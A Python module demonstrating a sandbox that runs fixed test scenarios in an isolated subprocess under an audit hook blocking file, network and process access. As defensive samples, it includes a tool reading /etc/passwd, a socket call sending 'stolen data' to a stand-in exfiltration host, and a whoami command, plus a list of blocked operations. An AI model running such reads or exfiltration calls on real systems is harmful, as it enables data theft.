"""M5 - Sandbox Simulation.

Demonstrates isolated execution of *test tools* in a controlled way:

* Only a fixed allow-list of built-in scenarios can run - no user-supplied code, ever.
* Each scenario runs in a separate Python process (`python -I -S`: isolated mode, no site
  packages, no user environment), with an empty temporary working directory, a minimal
  environment and a hard timeout (the process is killed when it expires).
* Inside the child process a PEP 578 audit hook denies: opening files outside the temp folder
  (except read-only access to the Python standard library), network sockets, and starting
  other processes.

Honesty note: Python audit hooks are a monitoring mechanism, not a hardened security boundary.
This module demonstrates the *concept* of sandboxed tool execution. A production deployment
should run untrusted tools in containers / gVisor / Firecracker micro-VMs (see Known Limitations).
"""
import os
import subprocess
import sys
import tempfile
import textwrap
import time
from pathlib import Path

TIMEOUT_SECONDS = 3

# The guard installed in the child process before the scenario code runs.
_GUARD = textwrap.dedent(r'''
    import os, sys
    _WORKDIR = os.path.realpath(os.getcwd())
    _STDLIB = os.path.realpath(sys.base_prefix)
    _BLOCKED_EVENTS = ("socket.connect", "socket.bind", "socket.getaddrinfo", "subprocess.Popen",
                       "os.system", "os.exec", "os.spawn", "os.posix_spawn", "os.startfile",
                       "_winapi.CreateProcess", "ctypes.dlopen", "shutil.rmtree")

    class SandboxViolation(Exception):
        pass

    def _inside(path, root):
        try:
            real = os.path.realpath(path)
        except Exception:
            return False
        return real == root or real.startswith(root + os.sep)

    def _guard(event, args):
        if event == "open":
            path, mode = args[0], (args[1] or "r")
            if isinstance(path, int):
                return
            path = os.fsdecode(path)
            writing = any(ch in str(mode) for ch in "wax+")
            if _inside(path, _WORKDIR):
                return
            if not writing and _inside(path, _STDLIB):
                return
            raise SandboxViolation(f"file access denied: {path}")
        if event in ("os.remove", "os.rename", "os.mkdir", "os.rmdir"):
            if not _inside(os.fsdecode(args[0]), _WORKDIR):
                raise SandboxViolation(f"{event} denied outside sandbox")
        if event.startswith(_BLOCKED_EVENTS):
            raise SandboxViolation(f"operation denied: {event}")

    sys.addaudithook(_guard)
''')

# Fixed scenario catalog: key -> (title, description, expected outcome, code)
SCENARIOS: dict[str, dict] = {
    "safe_computation": {
        "title": "Safe computation",
        "description": "A well-behaved tool computes prime numbers and writes a result file inside its own sandbox folder.",
        "expected": "completed",
        "code": textwrap.dedent('''
            primes = [n for n in range(2, 5000) if all(n % d for d in range(2, int(n ** 0.5) + 1))]
            with open("result.txt", "w") as handle:
                handle.write(str(len(primes)))
            print(f"computed {len(primes)} primes below 5000 and wrote result.txt inside the sandbox")
        '''),
    },
    "file_escape": {
        "title": "File system escape",
        "description": "A malicious tool tries to read a sensitive file outside its sandbox folder.",
        "expected": "blocked",
        "code": textwrap.dedent('''
            import os
            target = "C:/Windows/win.ini" if os.name == "nt" else "/etc/passwd"
            print(open(target).read())
        '''),
    },
    "network_exfiltration": {
        "title": "Network exfiltration",
        "description": "A malicious tool tries to open a network connection to send data out.",
        "expected": "blocked",
        "code": textwrap.dedent('''
            import socket
            connection = socket.create_connection(("exfil.example.net", 443), timeout=1)
            connection.sendall(b"stolen data")
        '''),
    },
    "process_spawn": {
        "title": "Command execution",
        "description": "A malicious tool tries to start a shell command on the host.",
        "expected": "blocked",
        "code": textwrap.dedent('''
            import subprocess
            subprocess.run(["whoami"])
        '''),
    },
    "infinite_loop": {
        "title": "Resource exhaustion (infinite loop)",
        "description": "A faulty tool never terminates; the sandbox kills it when the timeout expires.",
        "expected": "timeout",
        "code": textwrap.dedent('''
            counter = 0
            while True:
                counter += 1
        '''),
    },
}


def run_scenario(key: str) -> dict:
    if key not in SCENARIOS:
        raise KeyError(f"unknown sandbox scenario '{key}'")
    scenario = SCENARIOS[key]
    with tempfile.TemporaryDirectory(prefix="sentinel_sandbox_") as workdir:
        script = Path(workdir) / "tool.py"
        script.write_text(_GUARD + "\n" + scenario["code"], encoding="utf-8")
        # Minimal environment: nothing from the parent (no secrets, no PATH-based lookups).
        env = {"SYSTEMROOT": os.environ.get("SYSTEMROOT", ""), "PYTHONIOENCODING": "utf-8"}
        started = time.perf_counter()
        try:
            completed = subprocess.run(
                [sys.executable, "-I", "-S", str(script)], cwd=workdir, env=env,
                capture_output=True, text=True, timeout=TIMEOUT_SECONDS,
            )
            duration_ms = (time.perf_counter() - started) * 1000
            stdout, stderr = completed.stdout.strip(), completed.stderr.strip()
            blocked_line = next((line for line in reversed(stderr.splitlines()) if "SandboxViolation:" in line), None)
            if blocked_line:
                outcome = "blocked"
                blocked_operation = blocked_line.split("SandboxViolation:", 1)[-1].strip()
                output = f"Tool terminated by sandbox guard: {blocked_operation}"
            elif completed.returncode == 0:
                outcome, blocked_operation, output = "completed", None, stdout
            else:
                outcome, blocked_operation = "error", None
                output = (stderr.splitlines() or ["unknown error"])[-1]
        except subprocess.TimeoutExpired:
            duration_ms = (time.perf_counter() - started) * 1000
            outcome, blocked_operation = "timeout", f"execution exceeded {TIMEOUT_SECONDS}s"
            output = f"Process killed after {TIMEOUT_SECONDS} seconds (resource limit enforced)"
    return {
        "scenario": key,
        "title": scenario["title"],
        "outcome": outcome,
        "expected": scenario["expected"],
        "passed": outcome == scenario["expected"],
        "duration_ms": round(duration_ms, 1),
        "output": output[:2000],
        "blocked_operation": blocked_operation,
    }
